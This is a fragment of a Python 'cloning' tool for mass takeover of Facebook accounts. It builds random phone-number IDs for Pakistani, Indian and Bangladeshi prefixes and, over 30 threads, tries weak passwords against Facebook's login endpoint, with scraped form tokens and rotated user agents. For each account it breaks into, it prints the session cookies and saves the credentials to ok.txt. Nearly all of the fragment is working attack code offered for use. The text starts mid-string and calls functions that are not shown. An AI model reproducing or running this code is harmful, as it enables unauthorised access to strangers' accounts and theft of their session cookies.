\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]""")
try:
    print('\n\n\033[38;5;46mCRACKING UPDATE DONE\033[38;5;46m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[38;5;46m   No internet connection\033[38;5;46m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
# APK CHECK
def nahid_afridy():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('')
    print('\033[38;5;46m   PAK CODE   - \033[1;35m92301 \033[1;35m92302 \033[1;35m92303 \033[1;35m92305')
    os.system('espeak -a 300 "Choice pak code"')
    print('\033[38;5;46m   INDIA CODE - \033[1;34m91778 \033[1;34m91930 \033[1;34m91902 \033[1;34m91712')
    os.system('espeak -a 300 "choice indian code"')
    print('\033[38;5;46m   BD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m013 \033[1;32m018 \033[1;32m019 \033[1;32m014 \033[1;32m015')
    os.system('espeak -a 300 "choice bangladesh code"')
    print('')
    code = input('\033[38;5;46m   CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;93m   EXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;92m   CHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        os.system("clear")
        print(logo)
        tl = str(len(user))
        print('\033[38;5;46m   CHOOSE YOUR CODE : \033[1;92m' +code)
        os.system('espeak -a 300 "Your choice code"' +code)
        print('\033[38;5;46m   TOTAL IDS : \033[1;92m'+tl)
        os.system('espeak -a 300 "total  id limit"'+tl)
        print('\033[38;5;46m   TO STOP PROCESS Ctrl + Z')
        os.system('espeak -a 300 "clone stop to press cntrol z"')
        print('\033[38;5;46m   WILL RUN ON ANY NETWORK')
        jalan(' WAIT A 5 MINUTES ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        os.system('espeak -a 300 "Wait for 5 minutes"')
        print('')
        for love in user:
            pwx = [love, 'bangladesh', 'i love you']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mCRACK PROCESS HAS BEEN COMPLETED ')
    os.system('espeak -a 300 "PROCESS HAS BEEN COMPLETED"')
    print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mIDS SAVED IN EMRAN.txt')
 
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'web.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://web.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=1',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[38;5;46m[🦋⃟TANVIR✮⃝𝄟⃝] '+uid+' | '+ps+' \n\033[38;5;46mCOOKIES : \033[1;32m'+coki+   '  ')
                os.system('espeak -a 300 "Congratulations. ok id"')
                cek_apk(session,coki)
                open('/sdcard/\033[38;5;46mok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/BCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[🦋⃟TANVIR✮⃝𝄟⃝]\033[1;92m%s\033[m\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
    	pass
        
        
LEGENDBOY()

